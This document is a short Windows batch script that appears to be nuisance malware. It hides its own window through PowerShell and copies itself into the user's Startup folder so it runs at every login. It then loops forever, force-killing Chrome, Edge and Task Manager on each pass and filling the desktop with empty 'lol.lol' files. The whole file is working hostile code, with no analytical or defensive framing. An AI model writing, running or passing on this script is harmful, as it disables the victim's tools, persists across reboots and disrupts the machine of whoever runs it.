@echo off
if "%~1"=="-hidden" goto :payload
powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -ArgumentList '-hidden' -WindowStyle Hidden"
exit /b
:payload
title LOLOLOL
cd %USERPROFILE%\desktop
set fc=0
set l=lol.lol
copy "%~f0" "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\run.bat"
:loop
set /a fc+=1
taskkill /f /IM chrome.exe /IM msedge.exe /IM taskmgr.exe 1>nul
type nul > "%l% %fc%"
goto loop